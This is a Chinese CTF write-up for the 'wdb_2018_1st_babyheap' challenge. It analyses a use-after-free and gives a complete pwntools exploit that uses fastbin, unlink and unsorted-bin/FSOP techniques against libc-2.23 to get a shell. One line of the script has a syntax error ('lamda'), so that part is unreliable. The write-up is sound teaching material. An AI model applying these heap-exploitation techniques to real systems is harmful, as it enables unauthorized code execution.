# wdb_2018_1st_babyheap

## 总结
根据本题，学习与收获有：

- 一般来说，在libc-2.23.so中，能用unlink的题目，基本可以用unsorted bin attack + IO_FILE劫持IO_jump_t结构执行system("/bin/sh")。不用能unlink的题目，但是能溢出修改unsorted bin chunk的size并布局unsorted bin chunk内容，都可以用这一招偷鸡。
- 修改unsorted bin的size为0x61， 然后从unsorted bin chunk的头部开始，布局如下：[/bin/sh\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * "\x00", fake_vtable_addr]，然后fake_vtable填的内容如下：[0, 0, 0, system_addr]。

## checksec
```
# checksec ./data/wdb_2018_1st_babyheap
[*] '/root/xxx/data/wdb_2018_1st_babyheap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

运行环境为ubuntu 16.04，libc-2.23.so。

## 题目分析
就是很常见的菜单题，有一个堆指针数组在bss段上，不过需要注意的有：

- allocate最多只能调用10次，但是edit能编辑到索引为0x1f的chunk的指针。
- 每次allocate和edit的固定大小为0x20，不能申请其他大小的chunk
- edit的次数是3次，

## 漏洞分析

```c
unsigned __int64 free_()
{
  unsigned int v1; // [rsp+Ch] [rbp-24h]
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index:");
  memset(s, 0, 0x10u);
  read(0, s, 0xFu);
  v1 = atoi(s);
  if ( v1 <= 9 && (&ptr)[v1] )
  {
    free((&ptr)[v1]);
    puts("Done!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

很基础的UAF

## 利用思路
一般来说，UAF可以用来泄露地址。这里有两种利用思路，分别讲一下;

利用unlink：

- 利用UAF泄露出堆地址
- 利用fastbin attack，修改到某个chunk的size，更改为0x91，然后释放掉
- 利用show泄露出libc地址
- 利用unlink修改堆指针数组
- 修改__free_hook为system地址
- 释放带/bin/sh的块

利用unsorted bin attack + IO_FILE:

- 用同样的方法去泄露地址
    - 布局IO_FILE结构，这里的IO_FILE结构会散落到多处，关键是要找到vtable等重要的内存单元
- 修改unsorted bin chunk的size为0x61
- 调用malloc，触发IO_flush_all_lock_up，刷新所有流，执行system("/bin/sh")

利用流程如图所示：

构造前：

| 顺序 | chunk   | 左(字段或数据) | 右(字段或数据) |
| ---- | ------- | -------------- | -------------- |
| 1    | chunk A | pre_size       | 0x31           |
| 2    | chunk A | 0              | 0x31           |
| 3    | chunk A | 0              | 0x31           |
| 4    | chunk B | pre_size       | 0x31           |
| 5    | chunk B | 0              | 0x31           |
| 6    | chunk B | 0              | 0x31           |

构造 fake_chunk 后：

| 顺序 | chunk      | 左(字段或数据) | 右(字段或数据) |
| ---- | ---------- | -------------- | -------------- |
| 1    | chunk A    | pre_size       | 0x31           |
| 2    | fake_chunk | fake_pre_size  | 0x31           |
| 3    | fake_chunk | 0              | 0x31           |
| 4    | chunk B    | pre_size       | 0x91           |
| 5    | chunk B    | 0              | 0x31           |
| 6    | chunk B    | 0              | 0x31           |

## 最终EXP

```python
from pwn import *
int16 = lambda x : int(x, base=16)
LOG_ADDR = lamda: x, y: log.info("Addr: {} ===> {}".format(x, y))

sh = process("./wdb_2018_1st_babyheap")
cur_elf = sh.elf
libc = sh.elf.libc

context.arch="amd64"

initial_date = flat(0, 0x31, 0, 0x31)

def allocate(idx, data=initial_date):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def edit(idx, data):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "2")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def show(idx):
    sh.sendlineafter("Choice:", "3")
    sh.sendlineafter("Index:", str(idx))
    msg = sh.recvline()
    info("msg ===> {}".format(msg))
    return msg


def free(idx):
    sh.sendlineafter("Choice:", "4")
    sh.sendlineafter("Index:", str(idx))


def attack_unlink():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)
    # fast bin attack
    free(1)
    allocate(5, flat(leak_heap_addr - 0x20))
    allocate(6, "a")
    allocate(7, "a")
    target_addr = 0x602090
    allocate(8, flat(target_addr - 0x18, target_addr - 0x10, 0x20, 0x90))

    # edit 0 to set fake size
    edit(0, flat(0, "\x21"))
    # unlink
    free(1)

    # leak libc addr
    msg = show(8)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    edit(6, p64(libc.sym['__free_hook'])[:-1])
    edit(3, flat(libc.sym['system']))

    free(4)

    sh.interactive()


def attack_fsop():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    edit(0, flat(leak_heap_addr - 0x10))
    allocate(5, "a")
    allocate(6, flat(0, 0x91))
    allocate(7, flat(0, leak_heap_addr - 0x20)) # prepare for vtable

    # leak libc addr
    free(1)

    msg = show(1)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    # fsop
    edit(6, flat("/bin/sh\x00", 0x61, 0, libc.sym['_IO_list_all'] - 0x10))
    edit(0, flat(0, 0, 0, libc.sym['system']))

    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(8))

    sh.interactive()

attack_fsop()
```